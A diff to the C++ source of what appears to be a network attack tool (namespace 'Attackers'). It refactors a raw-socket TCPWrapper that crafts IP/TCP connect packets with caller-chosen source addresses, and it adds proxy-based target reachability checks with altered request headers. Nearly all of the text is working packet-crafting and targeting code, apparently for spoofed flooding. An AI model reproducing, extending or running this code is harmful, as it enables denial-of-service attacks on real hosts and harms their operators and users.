@@ -24,6 +24,7 @@
 #include "tcp_wrapper.h"
 #include "curl_wrapper.h"
 #include "net_utils.h"
+#include "config.h"
 #include "utils.h"
 
 using namespace Attackers;
@@ -37,6 +38,7 @@ TCPWrapper::TCPWrapper() noexcept
 	{
 		close(m_socketFD);
 		m_socketFD = -1;
+		SPDLOG_ERROR("Error while creating TCP socket, check if you are running with root");
 	}
 }
 
@@ -48,7 +50,7 @@ TCPWrapper::~TCPWrapper() noexcept
 	}
 }
 
-TCPWrapper::TCPStatus TCPWrapper::SendConnectPacket(const Target &srcAddress, const Target &destAddress) noexcept
+TCPWrapper::TCPStatus TCPWrapper::SendConnectPacket(const CURI &srcAddress, const CURI &destAddress) noexcept
 {
 	if(m_socketFD == -1)
 	{
@@ -60,8 +62,8 @@ TCPWrapper::TCPStatus TCPWrapper::SendConnectPacket(const Target &srcAddress, co
 		struct sockaddr_in addr;
 		std::memset(&addr, 0, sizeof(addr));
 		addr.sin_family = AF_INET;
-		addr.sin_port = destAddress.port;
-		addr.sin_addr.s_addr = inet_addr(destAddress.address.c_str());
+		addr.sin_port = htons(destAddress.GetPort().value_or(80));
+		addr.sin_addr.s_addr = inet_addr(destAddress.GetPureAddress()->c_str());
 
 		if(sendto(m_socketFD, packet->data(), NetUtil::IP_HEADER_LENGTH + TCP_HEADER_LENGTH, 0, 
 			(struct sockaddr *) &addr, sizeof(addr)) < 0)
@@ -70,34 +72,62 @@ TCPWrapper::TCPStatus TCPWrapper::SendConnectPacket(const Target &srcAddress, co
 		}
 		return TCPStatus::Success;
 	}
+	SPDLOG_ERROR("Error while sending TCP packet, check if you are running with root");
 	return TCPStatus::GotError;
 }
 
-std::optional<Target> TCPWrapper::CheckConnection(const CURI &destAddress, const std::vector<Proxy> &proxies) noexcept
+std::optional<CURI> TCPWrapper::CheckConnection(const CURI &destAddress, const std::vector<Proxy> &proxies) noexcept
 {
 	if(const auto resolved = NetUtil::GetHostAddresses(destAddress))
 	{
-		Target dest;
-		dest.port = htons(destAddress.GetPort().value_or(80));
+		std::pair<std::string, int> dest;
+		dest.second = htons(destAddress.GetPort().value_or(80));
 
 		for(struct addrinfo *addr = resolved->get(); 
 			addr != nullptr; addr = addr->ai_next)
 		{
-			dest.address.resize(INET_ADDRSTRLEN);
+			dest.first.resize(INET_ADDRSTRLEN);
 			if(inet_ntop(AF_INET, &((sockaddr_in *)addr->ai_addr)->sin_addr, 
-				dest.address.data(), dest.address.size()) == nullptr)
+				dest.first.data(), dest.first.size()) == nullptr)
 			{
 				continue;
 			}
 
-			return dest;
+			CURI destAddress{dest.first};
+			destAddress.SetPort(destAddress.GetPort().value_or(80));
+			
+			CURLLoader pinger;
+			Headers headers{CURLLoader::BASE_HEADERS};
+
+			if(proxies.size() != 0)
+			{
+				for(const auto &proxy : proxies)
+				{
+					UpdateHeaders(headers, proxy.first);
+					pinger.SetTarget(destAddress.GetFullURI());
+					pinger.SetProxy(proxy.first, proxy.second);
+
+					if(const auto resp = pinger.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS, &headers))
+					{
+						if(resp < 400)
+						{
+							return destAddress;
+						}
+					}
+				}
+			}
+			else
+			{
+				SPDLOG_INFO("No proxies provided for check returning first value");
+				return destAddress;
+			}
 		}
 	}
 
 	return {};
 }
 
-std::optional<NetUtil::IPTCPPacket> TCPWrapper::CreatePacket(const Target &srcAddress, const Target &destAddress) noexcept
+std::optional<NetUtil::IPTCPPacket> TCPWrapper::CreatePacket(const CURI &srcAddress, const CURI &destAddress) noexcept
 {
 	// Headers for IP
 	struct ip ipHeader;
@@ -130,12 +160,12 @@ std::optional<NetUtil::IPTCPPacket> TCPWrapper::CreatePacket(const Target &srcAd
 						  + (ipFlags[2] << 13)
 						  +  ipFlags[3]);
 
-	int respCode = inet_pton(AF_INET, srcAddress.address.c_str(), &(ipHeader.ip_src));
+	int respCode = inet_pton(AF_INET, srcAddress.GetPureAddress()->c_str(), &(ipHeader.ip_src));
 	if(respCode == -1)
 	{
 		return {};
 	}
-	respCode = inet_pton(AF_INET, destAddress.address.c_str(), &(ipHeader.ip_dst));
+	respCode = inet_pton(AF_INET, destAddress.GetPureAddress()->c_str(), &(ipHeader.ip_dst));
 	if(respCode == -1)
 	{
 		return {};
